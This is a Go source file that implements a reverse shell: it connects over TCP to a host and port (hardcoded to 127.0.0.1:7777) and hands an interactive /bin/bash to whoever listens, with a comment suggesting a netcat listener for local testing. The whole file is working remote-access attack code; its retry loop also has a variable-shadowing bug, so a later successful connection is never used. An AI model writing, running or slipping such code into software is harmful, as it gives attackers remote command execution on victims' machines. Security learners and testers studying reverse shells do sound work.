package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	reverse_shell("127.0.0.1", "7777")
}

// Function of the reverse shell, format IP:PORT in arg
func reverse_shell(host string, port string) {

	stderr := os.Stderr
	stdout := os.Stdout

	full_conn := host + ":" + port

	conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
	var i int = 0
	if err != nil { // Errors verification
		if nil != conn {
			conn.Close() // Close connexion in case of error
		}
		for i < 5 { // For loop to retry connexion for 5 times before exiting
			fmt.Fprintf(stderr, "Host connexion impossible\nTo try in local, you can : nc -nlvp 7777\n")
			time.Sleep(2 * time.Second)
			conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
			if err != nil {                         // Errors verification
				if nil != conn {
					conn.Close() // Close connexion in case of error
				}
			}
			i++
		}
		fmt.Fprintf(stderr, "EXITING - 5 failed connexions\n")
		os.Exit(1)
	}
	fmt.Fprintf(stdout, "Connexion up !\n")

	sh := exec.Command("/bin/bash")                   // Execution of bash
	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn // Redirect standard in/out/err to conn to redirect everything in the socket
	sh.Run()                                          // Shell execution

	conn.Close() // Clonnexion kill when shell is closed

	fmt.Fprintf(stdout, "Connexion closed !\n")
	os.Exit(0)

}
